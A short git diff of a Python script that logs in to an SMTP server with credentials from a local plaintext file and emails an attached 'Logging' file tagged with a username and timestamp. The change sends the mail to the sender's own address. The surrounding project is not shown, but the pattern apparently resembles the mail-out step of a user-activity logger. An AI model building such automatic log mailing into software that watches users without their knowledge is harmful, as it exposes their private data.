@@ -18,14 +18,13 @@ with open('e:\src\password.txt', 'r') as f:
     file = f.readlines()
     email = file[0]
     password = file[1]
-    to = file[2]
 
 server.login(email, password)
 current_time = datetime.datetime.now()
 
 msg = MIMEMultipart()
 msg['From'] = f'{username}-Logs'
-msg['To'] = to
+msg['To'] = email
 msg['Subject'] = f'Logging-{username}: {current_time}'
 
 #with open('message.txt', 'r') as f:
@@ -44,5 +43,5 @@ p.add_header('Content-Disposition', f'attachement; filename={filename}')
 msg.attach(p)
 
 text = msg.as_string()
-server.sendmail(email, to, text)
+server.sendmail(email, email, text)
 print('done')
